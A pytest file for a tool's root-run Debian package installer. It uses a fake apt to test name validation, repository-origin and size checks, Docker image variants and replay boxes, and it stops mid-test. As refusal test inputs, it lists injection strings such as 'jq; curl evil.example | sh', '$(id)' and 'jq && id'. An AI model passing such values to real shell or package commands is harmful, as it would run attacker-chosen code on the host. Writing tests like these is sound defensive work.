"""pickfit.verify.sysdeps: named distribution packages installed by pickfit's root, never by the box user.

Root's script runs here for real, against a stand-in apt (a small program that answers `apt-get` and `apt-cache`
from a JSON description of a repository), so what is checked is the script's own reading of apt's output."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

from pickfit.schema import ExtractionResult, VerificationRun
from pickfit.verify import sysdeps
from pickfit.verify.box import BoxError, DockerBox, ExecResult
from pickfit.verify.sysdeps import (
    FULL_MACHINE_REASON,
    GUIDE_PREFIX,
    IN_BOX,
    Installed,
    PackagedBoxes,
    apt_names,
    check_names,
    docker_variant,
    earlier_attempt,
    failure_names,
    guide_steps,
    install_named,
    planned_names,
    record,
    refusal,
    soname_package,
    with_guide_steps,
)
from test_profiles import cited, extraction
from verify_fakes import FakeBox

# A stand-in for apt-get and apt-cache: argv[0]'s name says which. It reads world.json beside it.
FAKE_APT = r'''
import json, os, sys
here = os.path.dirname(os.path.abspath(__file__))
world = json.load(open(os.path.join(here, "world.json")))
state_path = os.path.join(here, "state.json")
state = json.load(open(state_path)) if os.path.exists(state_path) else {"installed": [], "calls": []}
args = sys.argv[1:]
state["calls"].append([os.path.basename(sys.argv[0]), *args])
state["env"] = {k: os.environ.get(k) for k in ("PATH", "HOME", "TMPDIR", "DEBIAN_FRONTEND")}
json.dump(state, open(state_path, "w"))
packages, have = world["packages"], set(world.get("have", [])) | set(state["installed"])


def closure(names):
    order, seen = [], set()
    def visit(name):
        name = world.get("virtual", {}).get(name, [name])[0]
        if name in seen or name in have:
            return
        seen.add(name)
        for dep in packages[name].get("deps", []):
            visit(dep)
        order.append(name)
    for name in names:
        visit(name)
    return order


if os.path.basename(sys.argv[0]) == "apt-cache":
    if args[:1] == ["policy"]:
        print("Package files:\n 100 /var/lib/dpkg/status\n     release a=now")
        for site in world.get("sites", ["deb.debian.org"]):
            print(" 500 http://%s/debian trixie/main amd64 Packages\n     release v=13.8,o=Debian,l=Debian\n"
                  "     origin %s" % (site, site))
        print("Pinned packages:")
    elif args[:1] == ["show"]:
        for spec in (a for a in args[1:] if not a.startswith("-")):
            name = spec.split("=")[0]
            print("Package: %s\nInstalled-Size: %d\n" % (name, packages[name].get("kb", 100)))
    sys.exit(0)

words = [a for a in args if not a.startswith("-") and "::" not in a and a != "--"]
verb, names = words[0], words[1:]
if verb == "update":
    if world.get("update") == "needs_root" and "APT::Sandbox::User=root" not in args:
        sys.exit("E: Method http has died unexpectedly!")
    if world.get("update") == "fails":
        sys.exit("E: Failed to fetch http://deb.debian.org/debian/dists/trixie/InRelease  Temporary failure resolving")
    sys.exit(0)
if verb == "clean":
    sys.exit(0)
assert verb == "install" and "--no-remove" in args and args[args.index("--") + 1:] == names, args
for name in names:
    if name in world.get("patterns", []):
        print("Note, selecting 'libfoo1' for regex '%s'" % name)
        continue
    if len(world.get("virtual", {}).get(name, [])) > 1:
        sys.stderr.write("Package %s is a virtual package provided by:\n  a 1\n  b 1\n"
                         "E: Package '%s' has no installation candidate\n" % (name, name))
        sys.exit(100)
    if name not in packages and name not in world.get("virtual", {}):
        sys.stderr.write("E: Unable to locate package %s\n" % name)
        sys.exit(100)
    if name in world.get("conflicts", []):
        sys.stderr.write("E: Packages need to be removed but remove is disabled.\n")
        sys.exit(100)
together = world.get("clash")
if together and set(together) <= set(names):
    sys.stderr.write("E: Unable to correct problems, you have held broken packages.\n")
    sys.exit(100)
todo = closure([n for n in names if n not in world.get("patterns", [])])
if "-s" in args:
    for name in todo:
        p = packages[name]
        current = " [%s]" % p["current"] if p.get("current") else ""
        print("Inst %s%s (%s %s [amd64])" % (name, current, p.get("version", "1.0-1"),
                                             p.get("release", "Debian:13.8/stable")))
    for name in todo:
        print("Conf %s (%s Debian:13.8/stable [amd64])" % (name, packages[name].get("version", "1.0-1")))
    sys.exit(0)
assert "-y" in args, args
if world.get("install") == "fails":
    sys.stderr.write("E: Sub-process /usr/bin/dpkg returned an error code (1)\n")
    sys.exit(100)
state["installed"] += todo
json.dump(state, open(state_path, "w"))
'''

REPO: dict[str, Any] = {
    "have": ["libc6", "libgomp1"],
    "packages": {
        "libc6": {}, "libgomp1": {},
        "libxau6": {"version": "1:1.0.11-1", "kb": 80},
        "libxcb1": {"version": "1.17.0-2+b1", "deps": ["libxau6", "libc6"], "kb": 200},
        "libssl-dev": {"version": "3.5.4-1~deb13u1", "release": "Debian:13.8/stable, Debian-Security:13/stable-security",
                       "current": "3.5.1-1", "kb": 9000},
        "libglib2.0-0t64": {"version": "2.84.4-3", "kb": 4000},
        "texlive-full": {"kb": 6_000_000},
        "vendor-tool": {"release": "Vendor:1.0/stable"},
        "unlabelled": {"release": "apt.example.com"},
        "ffmpeg": {"kb": 2000}, "jq": {"kb": 100}, "replaces-the-shell": {},
    },
    "virtual": {"libglib2.0-0": ["libglib2.0-0t64"], "mail-transport-agent": ["exim4", "postfix"]},
    "patterns": ["lib.oo1"],
    "conflicts": ["replaces-the-shell"],
}


class RootBox(FakeBox):
    """A box with a root channel: harness_exec runs root's script here, against the stand-in apt in `root`."""

    def __init__(self, root: Path, world: dict[str, Any] | None = None, script: dict[str, Any] | None = None) -> None:
        super().__init__(script)
        self.root = root
        root.mkdir(parents=True, exist_ok=True)
        for name in ("apt-get", "apt-cache"):
            (root / name).write_text(f"#!{sys.executable}\n{FAKE_APT}", encoding="utf-8")
            (root / name).chmod(0o755)
        (root / "world.json").write_text(json.dumps({**REPO, **(world or {})}), encoding="utf-8")
        self.harness: list[list[str]] = []
        self.started = False

    def start(self) -> None:
        self.started = True

    def script_source(self) -> str:
        import os

        source = IN_BOX
        for old, new in (('APT_GET = "/usr/bin/apt-get"', f"APT_GET = {str(self.root / 'apt-get')!r}"),
                         ('APT_CACHE = "/usr/bin/apt-cache"', f"APT_CACHE = {str(self.root / 'apt-cache')!r}"),
                         ('TMP = "/var/lib/pickfit-sysdeps"', f"TMP = {str(self.root / 'tmp')!r}"),
                         ('POLICY = "/usr/sbin/policy-rc.d"', f"POLICY = {str(self.root / 'policy-rc.d')!r}"),
                         ("ROOT = 0", f"ROOT = {os.geteuid()}")):
            assert old in source, old
            source = source.replace(old, new)
        return source

    def harness_exec(self, argv: list[str], timeout_s: int, *, as_uid: int | None = None,
                     stdin: bytes | None = None) -> ExecResult:
        assert stdin == IN_BOX.encode() and as_uid is None, "root runs pickfit's own script, nothing else"
        self.harness.append(argv)
        ran = subprocess.run([sys.executable, "-I", "-S", "-", *argv[4:]], input=self.script_source(),
                             capture_output=True, text=True, timeout=60)
        return ExecResult(" ".join(argv), ran.returncode, ran.stdout, ran.stderr, 0.1)

    @property
    def state(self) -> dict[str, Any]:
        return json.loads((self.root / "state.json").read_text(encoding="utf-8"))

    def apt_calls(self, verb: str) -> list[list[str]]:
        return [c for c in self.state["calls"] if c[0] == "apt-get" and verb in c and "-s" not in c]


# ---------------------------------------------------------------- names


@pytest.mark.parametrize("name, why", [
    ("-y", "an option"), ("--allow-unauthenticated", "an option"), ("-o", "an option"),
    ("https://example.com/tool.deb", "a URL"), ("http://deb.example.com/x", "a URL"), ("file:/tmp/x.deb", "a URL"),
    ("./tool.deb", "a file or a path"), ("/tmp/tool.deb", "a file or a path"), ("tool.deb", "a file or a path"),
    ("tool_1.0_amd64.deb", "a file or a path"), ("../x", "a file or a path"), ("install.sh", "a file or a path"),
    ("jq; curl evil.example | sh", "not a package name"), ("jq && id", "not a package name"),
    ("$(id)", "not a package name"), ("`id`", "not a package name"), ("jq libfoo", "not a package name"),
    ("jq\nlibfoo", "not a package name"), ("jq>x", "not a package name"),
    ("jq=1.7", "a name only"), ("jq/trixie-backports", "a file or a path"), ("jq:i386", "a name only"),
    ("lib*", "a name only"), ("jq?", "a name only"), ("^lib", "a name only"), ("jq~", "a name only"),
    ("libfoo-", "a trailing -"), ("JQ", "not a Debian package name"), ("Libfoo1", "not a Debian package name"),
    ("j", "not a Debian package name"), ("", "not a package name"), (None, "not a package name"),
    (["jq"], "not a package name"), ("a" * 80, "not a Debian package name"), ("_apt", "not a Debian package name"),
    ("ppa:someone/repo", "a package source"), ("deb http://deb.example.com/ stable main", "a package source"),
])
def test_what_is_not_a_named_package_is_refused_before_anything_runs(name: Any, why: str) -> None:
    assert why in (refusal(name) or ""), (name, refusal(name))


@pytest.mark.parametrize("name", ["jq", "libxcb1", "libglib2.0-0", "g++", "libstdc++6", "libwebkit2gtk-4.1-dev",
                                  "python3.13", "7zip", "ocl-icd-opencl-dev", "libsdl2-2.0-0"])
def test_a_debian_package_name_may_be_asked_of_apt(name: str) -> None:
    assert refusal(name) is None


@pytest.mark.parametrize("name", ["sudo", "docker.io", "docker-ce", "docker-compose-plugin", "podman", "systemd",
                                  "systemd-sysv", "linux-headers-amd64", "linux-image-6.12.0-1-amd64", "dkms",
                                  "v4l2loopback-dkms", "snapd", "openssh-server", "containerd", "virtualbox"])
def test_what_needs_a_whole_machine_is_refused_with_that_reason(name: str) -> None:
    assert refusal(name) == FULL_MACHINE_REASON


def test_names_are_kept_once_in_order_and_capped() -> None:
    accepted, refused = check_names(["jq", "libxcb1", "jq", "x.deb", "-y", 7])
    assert accepted == ("jq", "libxcb1")
    assert set(refused) == {"x.deb", "-y", "7"}
    accepted, refused = check_names([f"lib{i}x" for i in range(20)], limit=16)
    assert len(accepted) == 16 and len(refused) == 4 and "more than 16 names" in refused["lib16x"]


# ---------------------------------------------------------------- the install, as root's script does it


def test_named_packages_are_installed_by_root_with_the_boxes_own_sources(tmp_path: Path) -> None:
    box = RootBox(tmp_path)
    lines: list[str] = []
    result = install_named(box, ["libxcb1", "libssl-dev", "libgomp1"], log=lines.append)
    assert result.ok and result.error is None and result.refused == {}
    assert result.installed == ("libxcb1", "libssl-dev") and result.present == ("libgomp1",)
    # Dependencies are listed with their versions; the size is the packages' own Installed-Size.
    assert result.added == ("libxau6=1:1.0.11-1", "libxcb1=1.17.0-2+b1", "libssl-dev=3.5.4-1~deb13u1")
    assert result.megabytes == pytest.approx((80 + 200 + 9000) / 1024, abs=0.1)
    # The exact command: an install of the names and nothing else. No source, key, file or removal.
    assert result.command.startswith(str(tmp_path / "apt-get"))
    assert result.command.endswith("install -y --no-remove -- libxcb1 libssl-dev")
    assert "sources" not in result.command and "add" not in result.command.split()
    installs = box.apt_calls("install")
    assert len(installs) == 1 and installs[0][-5:] == ["-y", "--no-remove", "--", "libxcb1", "libssl-dev"]
    assert box.state["installed"] == ["libxau6", "libxcb1", "libssl-dev"]
    # Root's script ran through the harness's own channel, never as a box-user command.
    assert box.ran == [] and len(box.harness) == 1
    assert box.harness[0][:4] == ["/usr/local/bin/python3", "-I", "-S", "-"]
    asked = json.loads(box.harness[0][4])
    assert asked["names"] == ["libxcb1", "libssl-dev", "libgomp1"] and asked["hosts"] == list(sysdeps.DISTRO_HOSTS)
    # Its own PATH and HOME, a temporary directory of its own, and no daemon may start.
    env = box.state["env"]
    assert env["PATH"].startswith("/usr/local/sbin:") and env["HOME"] == "/root"
    assert env["TMPDIR"] == str(tmp_path / "tmp") and env["DEBIAN_FRONTEND"] == "noninteractive"
    assert (tmp_path / "tmp").stat().st_mode & 0o777 == 0o700
    assert (tmp_path / "policy-rc.d").read_text(encoding="utf-8") == "#!/bin/sh\nexit 101\n"
    assert lines == [f"packages · {result.describe()} · {result.seconds:.0f}s"]
    assert "installed libxcb1, libssl-dev" in lines[0] and "already there: libgomp1" in lines[0]


def test_each_refusal_has_its_own_reason_and_the_rest_still_install(tmp_path: Path) -> None:
    box = RootBox(tmp_path)
    result = install_named(box, ["jq", "no-such-package", "lib.oo1", "mail-transport-agent", "replaces-the-shell",
                                 "vendor-tool", "unlabelled", "tool.deb", "sudo", "libglib2.0-0"])
    assert result.installed == ("jq", "libglib2.0-0") and not result.ok  # a virtual name with one provider is fine
    assert result.added == ("jq=1.0-1", "libglib2.0-0t64=2.84.4-3")
    r = result.refused
    assert r["no-such-package"] == "not a package in the distribution's repository"
    assert r["lib.oo1"] == "not an exact package name (apt would read it as a pattern)"
    assert r["mail-transport-agent"].startswith("no single installable package of that name")
    assert "remove" in r["replaces-the-shell"]
    assert r["vendor-tool"] == ("would install vendor-tool from outside the distribution's repository "
                                "(Vendor:1.0/stable)")
    assert "outside the distribution's repository (apt.example.com)" in r["unlabelled"]
    assert "a file or a path" in r["tool.deb"] and r["sudo"] == FULL_MACHINE_REASON
    # What was refused on the host never reached the box.
    assert json.loads(box.harness[0][4])["names"] == ["jq", "no-such-package", "lib.oo1", "mail-transport-agent",
                                                      "replaces-the-shell", "vendor-tool", "unlabelled", "libglib2.0-0"]
    assert box.state["installed"] == ["jq", "libglib2.0-0t64"]


def test_a_box_with_a_source_outside_the_distribution_installs_nothing(tmp_path: Path) -> None:
    box = RootBox(tmp_path, {"sites": ["deb.debian.org", "ppa.launchpadcontent.net"]})
    result = install_named(box, ["jq"])
    assert result.installed == () and "outside the distribution's own: ppa.launchpadcontent.net" in result.error
    assert box.apt_calls("install") == []


def test_a_request_that_unpacks_to_too_much_is_refused(tmp_path: Path) -> None:
    box = RootBox(tmp_path)
    result = install_named(box, ["texlive-full"])
    assert result.installed == () and "over the 2048 MB" in result.refused["texlive-full"]
    assert result.megabytes == pytest.approx(5859.4, abs=0.1) and box.apt_calls("install") == []
    assert install_named(RootBox(tmp_path / "b"), ["texlive-full"], max_mb=8000).installed == ("texlive-full",)


def test_names_that_do_not_install_together_are_all_refused(tmp_path: Path) -> None:
    box = RootBox(tmp_path, {"clash": ["jq", "ffmpeg"]})
    result = install_named(box, ["jq", "ffmpeg"])
    assert result.installed == () and set(result.refused) == {"jq", "ffmpeg"}
    assert all(why.startswith("together with the others asked") for why in result.refused.values())


def test_a_failed_update_or_install_is_an_error_not_an_exception(tmp_path: Path) -> None:
    result = install_named(RootBox(tmp_path / "a", {"update": "fails"}), ["jq"])
    assert result.installed == () and result.error.startswith("apt-get update failed: Failed to fetch")
    result = install_named(RootBox(tmp_path / "b", {"install": "fails"}), ["jq"])
    assert result.installed == () and "apt-get install failed" in result.error and result.command is None
    # Where apt's own download user cannot reach the network, the update is tried once more as root.
    box = RootBox(tmp_path / "c", {"update": "needs_root"})
    result = install_named(box, ["jq"])
    assert result.installed == ("jq",) and "APT::Sandbox::User=root" in result.command
    assert len(box.apt_calls("update")) == 2


def test_boxes_that_cannot_install_say_why(tmp_path: Path) -> None:
    plain = FakeBox()  # no root channel, like DockerBox
    result = install_named(plain, ["jq"])
    assert result.installed == () and "no root channel" in result.error and plain.ran == []
    offline = RootBox(tmp_path)
    offline.set_network(False)
    assert "network is off" in install_named(offline, ["jq"]).error and offline.harness == []
    mac = RootBox(tmp_path / "mac")
    mac.os = "macos"
    assert "only a Debian-based Linux box" in install_named(mac, ["jq"]).error
    # Nothing acceptable asked: the box is not touched at all.
    nothing = RootBox(tmp_path / "n")
    result = install_named(nothing, ["x.deb", "-y"])
    assert result.error is None and set(result.refused) == {"x.deb", "-y"} and nothing.harness == []

    class Dead(RootBox):
        def harness_exec(self, *args: Any, **kw: Any) -> ExecResult:
            raise BoxError("the sandbox died")

    assert install_named(Dead(tmp_path / "d"), ["jq"]).error == "the box failed: the sandbox died"

    class Silent(RootBox):
        def harness_exec(self, argv: list[str], timeout_s: int, **kw: Any) -> ExecResult:
            return ExecResult("x", 137, "", "Killed", 300.0, timed_out=True)

    assert "gave no result: Killed" in install_named(Silent(tmp_path / "s"), ["jq"]).error


def test_only_the_last_result_line_counts() -> None:
    forged = sysdeps.MARK + json.dumps({"installed": ["sudo"]})
    real = sysdeps.MARK + json.dumps({"installed": ["jq"]})
    assert sysdeps.read_result(f"{forged}\nSetting up jq ...\n{real}\n")["installed"] == ["jq"]
    assert sysdeps.read_result("no result here") is None and sysdeps.read_result(sysdeps.MARK + "{broken") is None


def test_the_script_refuses_to_run_as_anyone_but_root_and_checks_names_again(tmp_path: Path) -> None:
    box = RootBox(tmp_path)
    source = box.script_source().replace(f"ROOT = {__import__('os').geteuid()}", "ROOT = 424242")
    ran = subprocess.run([sys.executable, "-I", "-S", "-", sysdeps.request(["jq"])], input=source,
                         capture_output=True, text=True, timeout=30)
    assert sysdeps.read_result(ran.stdout)["error"] == "not run as root"
    ran = subprocess.run([sys.executable, "-I", "-S", "-", sysdeps.request(["jq", "-o", "x.deb"])],
                         input=box.script_source(), capture_output=True, text=True, timeout=30)
    assert sysdeps.read_result(ran.stdout)["error"] == "a name is not a package name"
    assert not (tmp_path / "state.json").exists()  # apt was never called


# ---------------------------------------------------------------- DockerBox: an image, not a running box


class FakeDocker:
    def __init__(self, result: dict[str, Any] | None, label: str = "") -> None:
        self.result, self.label, self.calls = result, label, []

    def __call__(self, argv: list[str], **kw: Any) -> subprocess.CompletedProcess:
        self.calls.append(argv)
        if argv[1:3] == ["image", "inspect"]:
            return subprocess.CompletedProcess(argv, 0 if self.label else 1, self.label + "\n", "")
        if argv[1] == "run":
            assert kw["input"] == IN_BOX.encode()
            out = (sysdeps.MARK + json.dumps(self.result) + "\n").encode() if self.result is not None else b""
            return subprocess.CompletedProcess(argv, 0, out, b"")
        return subprocess.CompletedProcess(argv, 0, "", "")


def test_a_docker_box_gets_its_packages_as_an_image(monkeypatch: pytest.MonkeyPatch) -> None:
    found = {"installed": ["jq"], "present": [], "refused": {}, "added": ["jq=1.7.1-6"], "command": "apt-get ...",
             "error": None, "megabytes": 0.4}
    docker = FakeDocker(found)
    monkeypatch.setattr(sysdeps.subprocess, "run", docker)
    result = docker_variant(["jq", "x.deb"], base="pickfit-sbx:abc", log=lambda s: None)
    tag = sysdeps.variant_tag("pickfit-sbx:abc", ["jq"])
    assert result.image == tag and tag.startswith("pickfit-sbx-pkg:") and result.installed == ("jq",)
    assert "a file or a path" in result.refused["x.deb"]
    run = next(c for c in docker.calls if c[1] == "run")
    # A throwaway container of the base image, as root; the box itself (uid 1000, read-only root) is another one.
    assert run[run.index("--user") + 1] == "0" and "pickfit-sbx:abc" in run and "--privileged" not in run
    assert json.loads(run[-1])["names"] == ["jq"] and not any(a.startswith(("-v", "--volume", "--mount")) for a in run)
    commit = next(c for c in docker.calls if c[1] == "commit")
    assert commit[-1] == tag and docker.calls[-1][1:3] == ["rm", "-f"]
    # The same request again reads the image's label and runs nothing.
    label = commit[commit.index("--change") + 1].split("=", 1)[1]
    again = FakeDocker(None, label)
    monkeypatch.setattr(sysdeps.subprocess, "run", again)
    assert docker_variant(["jq"], base="pickfit-sbx:abc").installed == ("jq",) and len(again.calls) == 1
    # Nothing installed: no image is made, and the box starts from the base.
    none = FakeDocker({**found, "installed": [], "refused": {"nope": "not a package in the distribution's repository"}})
    monkeypatch.setattr(sysdeps.subprocess, "run", none)
    result = docker_variant(["nope"], base="pickfit-sbx:abc")
    assert result.image == "pickfit-sbx:abc" and not any(c[1] == "commit" for c in none.calls)


# ---------------------------------------------------------------- one run's boxes, the guide, the replay


def test_every_box_of_a_run_gets_the_packages_and_the_replay_exactly_the_agents(tmp_path: Path) -> None:
    made: list[RootBox] = []

    def make(run_id: str, role: str) -> RootBox:
        made.append(RootBox(tmp_path / role))
        return made[-1]

    lines: list[str] = []
    boxes = PackagedBoxes(make, ["libxcb1", "no-such-package"], log=lines.append)
    agent = boxes("run", "agent")
    assert not agent.harness, "nothing is installed before the box is started"
    agent.start()
    assert boxes.results["agent"].installed == ("libxcb1",) and "no-such-package" in boxes.results["agent"].refused
    assert agent.state["installed"] == ["libxau6", "libxcb1"]
    # The agent is told, in the box's own description.
    assert "System packages pickfit installed for this tool, as root: libxcb1" in agent.describe()
    assert f"`{GUIDE_PREFIX}libxcb1`" in agent.describe()
    # The replay box is a fresh one, and it is asked for what the agent's box got: not for what was refused.
    replay = boxes("run", "replay")
    assert replay is not agent and not replay.harness
    replay.start()
    assert json.loads(replay.harness[0][4])["names"] == ["libxcb1"]
    assert replay.state["installed"] == ["libxau6", "libxcb1"] and boxes.guide_names() == ("libxcb1",)
    assert [line.split(" · ")[0] for line in lines] == ["packages (agent box)", "packages (replay box)"]


def test_a_replay_box_that_does_not_get_the_packages_fails_to_start(tmp_path: Path) -> None:
    worlds = {"agent": None, "replay": {"install": "fails"}}
    made: dict[str, RootBox] = {}

    def make(run_id: str, role: str) -> RootBox:
        made[role] = RootBox(tmp_path / role, worlds[role])
        return made[role]

    boxes = PackagedBoxes(make, ["jq"], log=lambda s: None)
    boxes("run", "agent").start()
    replay = boxes("run", "replay")
    with pytest.raises(BoxError, match="the replay box did not get the packages the agent's box had \\(jq\\)"):
        replay.start()
    assert made["replay"].closed and boxes.guide_names() == ()


def test_boxes_that_are_not_linux_or_have_nothing_to_install_are_left_alone(tmp_path: Path) -> None:
    mac = RootBox(tmp_path / "mac")
    mac.os = "macos"
    boxes = PackagedBoxes(lambda run_id, role: mac, ["jq"], log=lambda s: None)
    box = boxes("run", "agent")
    box.start()
    assert box.harness == [] and boxes.results == {}
    plain = RootBox(tmp_path / "plain")
    assert PackagedBoxes(lambda run_id, role: plain, [], log=lambda s: None)("run", "agent") is plain
    # An agent box that got nothing: the replay box installs nothing either, and the guide gains no step.
    boxes = PackagedBoxes(lambda run_id, role: RootBox(tmp_path / role), ["no-such-package"], log=lambda s: None)
    boxes("run", "agent").start()
    replay = boxes("run", "replay")
    replay.start()
    assert replay.harness == [] and boxes.guide_names() == ()


def test_a_docker_box_starts_from_the_image_that_holds_the_packages(monkeypatch: pytest.MonkeyPatch) -> None:
    started: list[str] = []
    monkeypatch.setattr(sysdeps, "ensure_docker", lambda **kw: None)
    monkeypatch.setattr(sysdeps, "ensure_image", lambda *a, **kw: None)
    monkeypatch.setattr(sysdeps, "docker_variant", lambda names, **kw: Installed(
        requested=tuple(names), installed=tuple(names), image="pickfit-sbx-pkg:123"))
    monkeypatch.setattr(DockerBox, "start", lambda self: started.append(self.image))
    boxes = PackagedBoxes(lambda run_id, role: DockerBox(image="pickfit-sbx:abc", log=lambda s: None), ["jq"],
                          log=lambda s: None)
    for role in ("agent", "replay"):
        boxes("run", role).start()
    assert started == ["pickfit-sbx-pkg:123"] * 2 and boxes.guide_names() == ("jq",)
    # The box itself is unchanged: uid 1000, no capabilities, a read-only root.
    args = boxes("run", "confirm").run_args()
    assert "--read-only" in args and "1000:1000" in args and "--cap-drop=ALL" in args


def run_with(steps: list[str], **over: Any) -> VerificationRun:
    data = {"id": "verify-tool-20261121-000000-abcd", "level": "function", "os": "linux", "arch": "x86_64",
            "method": "sandbox", "checked_at": "2026-11-21T10:00:00+08:00", "replayed": True,
            "steps": [{"command": c} for c in steps], "evidence": {"trace_path": "runs/x/report.json"},
            "smoke_tests": [{"command": "tool --version", "exit_code": 0, "expected_signal": "1.0", "passed": True}],
            "judge": {"verdict": "working", "observed": "prints its version", "model": "m"}}
    data.update(over)
    return VerificationRun.model_validate(data)


def test_the_guide_gains_the_packages_step_first() -> None:
    assert [s.command for s in guide_steps(["libxcb1", "libgl1"])] == ["sudo apt-get install -y libxcb1 libgl1"]
    assert guide_steps([]) == []
    # A line that would not fit a step is split, and every name is still there.
    many = [f"libverylongpackagename{i:02d}-with-a-long-suffix-dev" for i in range(16)]
    steps = guide_steps(many)
    assert len(steps) > 1 and all(len(s.command) <= 500 and s.command.startswith(GUIDE_PREFIX) for s in steps)
    assert " ".join(s.command[len(GUIDE_PREFIX):] for s in steps).split() == many
    run = run_with(["uv tool install tool"], pitfalls=[
        {"readme_said": "install step 1 runs install.sh straight from the network", "kind": "note",
         "actually_needed": "nothing to change; a note"}])
    out = with_guide_steps(run, ["libxcb1"])
    assert [s.command for s in out.steps] == ["sudo apt-get install -y libxcb1", "uv tool install tool"]
    assert "pickfit installed them as root" in out.steps[0].purpose
    assert out.pitfalls[0].readme_said.startswith("install step 2 runs install.sh")  # numbered as the guide lists
    assert with_guide_steps(out, ["libxcb1"]) == out  # once
    assert with_guide_steps(run, []) == run
    # Only what a fresh box replayed is a guide: a run that was not replayed gains nothing.
    unreplayed = run_with(["uv tool install tool"], replayed=False, level="unverified", unverified_reason="other",
                          judge=None, smoke_tests=[])
    assert with_guide_steps(unreplayed, ["libxcb1"]) == unreplayed
    from pickfit.verify.result import install_guide

    assert install_guide(out).steps[0].command == "sudo apt-get install -y libxcb1"


def test_record_saves_what_each_box_got_and_adds_the_replays_packages(tmp_path: Path) -> None:
    boxes = PackagedBoxes(lambda run_id, role: RootBox(tmp_path / role), ["libxcb1", "tool.deb"], log=lambda s: None)
    run = run_with(["uv tool install tool"])
    assert record(run, boxes, tmp_path) == run and not (tmp_path / "sysdeps.json").exists()  # no box ran yet
    boxes("run", "agent").start()
    assert record(run, boxes, tmp_path) == run  # the agent's box alone is not a replay
    boxes("run", "replay").start()
    out = record(run, boxes, tmp_path)
    assert [s.command for s in out.steps] == ["sudo apt-get install -y libxcb1", "uv tool install tool"]
    saved = json.loads((tmp_path / "sysdeps.json").read_text(encoding="utf-8"))
    assert saved["agent"]["refused"]["tool.deb"] and saved["replay"]["installed"] == ["libxcb1"]
    assert saved["replay"]["command"].endswith("install -y --no-remove -- libxcb1")
    assert record(run, lambda run_id, role: None, tmp_path) == run  # any other factory changes nothing


def test_the_pipeline_puts_the_replayed_packages_first_in_the_runs_steps(tmp_path: Path, monkeypatch) -> None:
    import pickfit.env
    import test_verify_pipeline as tp
    from pickfit import meta
    from verify_fakes import FakeServer

    monkeypatch.setattr(pickfit.env, "DOTENV_PATH", tmp_path / "missing.env")
    for name in ("PICKFIT_MODE", "PICKFIT_CACHE", "MODEL_API_KEY"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("PICKFIT_LEDGER", str(tmp_path / "default-ledger.sqlite"))
    monkeypatch.setattr(meta, "sleep", lambda s: None)
    made: dict[str, RootBox] = {}

    def make(run_id: str, role: str) -> RootBox:
        made[role] = RootBox(tmp_path / "boxes" / role, script=dict(tp.SCRIPT))
        return made[role]

    boxes = PackagedBoxes(make, ["libxcb1"], log=lambda s: None)
    server = FakeServer(*tp.agent_turns(), tp.judge_answer("working"))
    outcome, lines = tp.verify(tmp_path, server, boxes)
    run = outcome.run
    assert outcome.passed and run.replayed
    assert [s.command for s in run.steps] == ["sudo apt-get install -y libxcb1", "uv tool install graphtty"]
    saved = VerificationRun.model_validate_json(
        (outcome.evidence_dir / "verification_run.json").read_text(encoding="utf-8"))
    assert saved == run and (outcome.evidence_dir / "sysdeps.json").exists()
    # Two fresh boxes, each given the package by root; the box user's own commands never ran apt.
    assert sorted(made) == ["agent", "replay"] and all(len(box.harness) == 1 and box.closed for box in made.values())
    assert made["replay"].state["installed"] == ["libxau6", "libxcb1"]
    assert not any("apt" in command for box in made.values() for command, _ in box.ran)
    # The agent read about the packages in its task.
    assert "System packages pickfit installed for this tool, as root: libxcb1" in json.dumps(server.requests[0])


# ---------------------------------------------------------------- which packages, from what is already known


def ex(**over: Any) -> ExtractionResult:
    data = extraction(install_methods=[{"method": "pipx", "command": "pipx install tool", "platforms": []}])
    pre = over.pop("pre", None)
    if pre:
        data["prerequisites"] = {**data["prerequisites"], **pre}
    data.update(over)
    return ExtractionResult.model_validate(data)


def test_apt_lines_give_their_names_and_nothing_after_the_command() -> None:
    assert apt_names("sudo apt-get install -y libgtk-3-dev libwebkit2gtk-4.1-dev && cargo install tool") == [
        "libgtk-3-dev", "libwebkit2gtk-4.1-dev"]
    assert apt_names("Run `sudo apt install ffmpeg` and you are set. Then apt-get install --no-install-recommends "
                     "jq and restart.") == ["ffmpeg", "jq"]
    assert apt_names("apt install ./tool.deb") == [] and apt_names("apt update && apt upgrade") == []
    assert apt_names("apt-get install -y docker.io") == ["docker.io"]  # kept, to be refused with its reason
    assert apt_names("pip install requests") == []


def test_a_missing_library_or_pkg_config_module_names_its_package() -> None:
    assert [soname_package(s) for s in ("libxcb.so.1", "libGL.so.1", "libglib-2.0.so.0", "libX11.so.6",
                                        "libgtk-3.so.0", "libwebkit2gtk-4.1.so.0", "libasound.so.2")] == [
        "libxcb1", "libgl1", "libglib2.0-0", "libx11-6", "libgtk-3-0", "libwebkit2gtk-4.1-0", "libasound2"]
    assert failure_names("ImportError: libxcb.so.1: cannot open shared object file: No such file or directory") == [
        "libxcb1"]
    assert failure_names("error: Package 'webkit2gtk-4.1', required by 'virtual:world', not found\n"
                         "No package 'alsa' found") == ["libwebkit2gtk-4.1-dev", "libasound2-dev"]
    assert failure_names("try: sudo apt-get install libudev-dev") == ["libudev-dev"]
    assert failure_names("Segmentation fault") == [] and failure_names(None) == []


def test_packages_are_planned_from_the_extraction_and_more_after_a_needs_root_attempt() -> None:
    pre = {"system_packages": [cited("ffmpeg and ffprobe (strongly recommended)", "needs ffmpeg"),
                               cited("WebKitGTK 4.1", "sudo apt install libwebkit2gtk-4.1-dev libgtk-3-dev"),
                               cited("tesseract>=4.1.1", "Tesseract 4.1.1 or newer"),
                               cited("libgmp-dev libmpfr-dev libmpc-dev", "GMP, MPFR and MPC headers"),
                               cited("Docker", "Docker must be running"), cited("Git", "git on your PATH"),
                               cited("Tkinter Tcl/Tk 8.4 or later", "Tk 8.4+"), cited("uv", "uv")]}
    tool = ex(pre=pre)
    assert planned_names(tool) == ("ffmpeg", "libwebkit2gtk-4.1-dev", "libgtk-3-dev", "tesseract-ocr", "libgmp-dev",
                                   "libmpfr-dev", "libmpc-dev", "docker")
    assert refusal("docker") == FULL_MACHINE_REASON  # asked, so that the log says where such a tool belongs
    # A record that states nothing gets nothing, whatever its README says: the first attempt runs as it always did.
    readme = "## Linux\n\n```sh\nsudo apt-get install -y libxkbcommon-dev libasound2-dev\n```\n"
    assert planned_names(ex(), readme=readme) == ()
    assert planned_names(ex(), readme=readme, earlier_reason="other") == ()
    # After an attempt that stopped for lack of root: the README's own apt line, and what the error named.
